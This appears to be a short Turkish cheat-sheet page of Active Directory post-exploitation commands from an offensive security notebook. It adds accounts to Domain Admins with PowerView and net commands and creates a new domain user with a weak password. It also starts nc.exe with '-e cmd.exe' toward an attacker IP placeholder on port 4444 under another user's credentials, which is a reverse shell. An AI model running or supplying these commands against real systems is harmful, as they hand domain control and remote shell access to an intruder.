---
layout: page
title: "Genellikle İlk Yapılacak İşlemler"
permalink: /linux/winrm-komutlari/
---

```bash
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'svc_test' 
Get-DomainGroupMember -Identity 'Domain Admins'
Get-ADGroupMember "Exchange Windows Permissions" | Select Name, SamAccountName
```

Kullanıcı oluşturma yetkin varsa:
```bash
net user testuser1 Yeni123 /add /domain
net group "Domain Admins" testuser1 /add /domain
```

Başka Kullanıcı adına process açma:
```bash
$username = "TestUser@test.local"
$password = "parola_buraya"  
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
Start-Process -FilePath "C:\xampp\htdocs\nc.exe" -ArgumentList "-e cmd.exe 10.MY.IP 4444" -Credential $credential
```
